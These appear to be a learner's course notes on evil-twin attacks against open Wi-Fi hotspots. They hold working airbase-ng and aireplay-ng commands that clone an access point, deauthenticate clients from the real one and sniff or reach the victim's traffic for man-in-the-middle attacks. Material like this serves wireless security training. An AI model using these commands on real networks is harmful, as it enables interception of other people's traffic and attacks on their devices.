Part 9: Hotspot Attacks
===============

-Caracteristiks
	-Open authentication
	-MAC filtering sometimes
	-No encryption
	-Captive portal sometimes

-Hotspot attack
	-Create a soft AP with the same ESSID. Optiional: same BSSID
	-Scenario
		-Deauthenticate client to the real AP
		-Client connects to fake AP as long as it has better signal strength
	-Post scenario
		-MITM
		-exploit

-Pratical attack
	-Create AP on specified channel
		# airbase-ng -a $BSSID --essid $SSID_TO_PWN mon0
		- it creates a logical wired interface 'at0'
		# ifconfig at0 up

	- Deauth clients
		# aireplay-ng --deauth 0 -a $BSSID_TO_PWN mon0
	
	- Wireshark on at0 since it is only the interesting traffic generated by the client
		- Client keeps sending DHCP
		- After not receiving, it takes a auto config adrr: 169.254.0.0/16
			"Gratuitous ARP for 169.254.X.X"
		- After that
			# ifconfig at0 169.254.174.226 netmask 255.255.255.0 up
			# ping $TARGET_ADDR
			- IP layer connectivity
